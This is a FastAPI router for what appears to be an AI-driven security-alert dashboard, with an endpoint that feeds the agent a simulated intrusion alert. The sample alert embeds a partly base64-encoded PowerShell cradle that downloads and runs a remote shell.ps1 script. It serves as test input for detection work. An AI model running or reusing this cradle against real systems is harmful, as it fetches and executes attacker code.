import os
import threading
from fastapi import APIRouter
from fastapi.responses import HTMLResponse
from web.state import STATE

router = APIRouter()

@router.get("/api/state")
def get_state():
    return {
        "stats": STATE["stats"],
        "reasoning_stream": list(STATE["reasoning_stream"]),
        "decisions": list(STATE["decisions"])
    }

@router.post("/api/simulate")
def simulate_attack():
    from core.controller import run_agent_loop
    sample = {
        "source": "Suricata NIDS + Wazuh EDR",
        "level": 12,
        "title": "ET SCAN Nmap Scripting Engine & Encoded PowerShell Execution",
        "src_ip": "192.168.63.250",
        "dest_ip": "192.168.214.10",
        "encoded_payload": "cG93ZXJzaGVsbCAtZW5jIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnhttp://192.168.63.250/shell.ps1')"
    }
    threading.Thread(target=run_agent_loop, args=(sample,), daemon=True).start()
    return {"status": "triggered"}

@router.get("/", response_class=HTMLResponse)
def get_ui():
    html_path = os.path.join(os.path.dirname(__file__), "templates", "index.html")
    with open(html_path, "r", encoding="utf-8") as f:
        return f.read()

